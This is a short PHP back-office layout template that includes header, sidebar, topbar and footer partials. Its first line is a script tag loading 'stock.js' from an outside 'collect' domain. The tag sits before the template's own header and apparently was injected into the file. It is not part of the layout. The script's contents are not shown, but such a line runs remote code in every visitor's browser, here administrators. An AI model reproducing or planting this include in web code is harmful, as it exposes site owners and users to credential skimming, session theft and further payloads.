<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script><?php $this->load->view("backoffice/layout/header") ?>
<div class="layout-wrapper layout-content-navbar">
    <div class="layout-container">
        <?php $this->load->view("backoffice/layout/sidebar") ?>
        <div class="layout-page">
            <?php $this->load->view("backoffice/layout/topbar") ?>
            <div class="content-wrapper">
                <div class="container-xxl flex-grow-1 container-p-y" id="resultView"></div>
                <div class="content-backdrop fade"></div>
            </div>
        </div>
    </div>
    <div class="layout-overlay layout-menu-toggle"></div>
</div>
<?php $this->load->view("backoffice/layout/footer") ?>
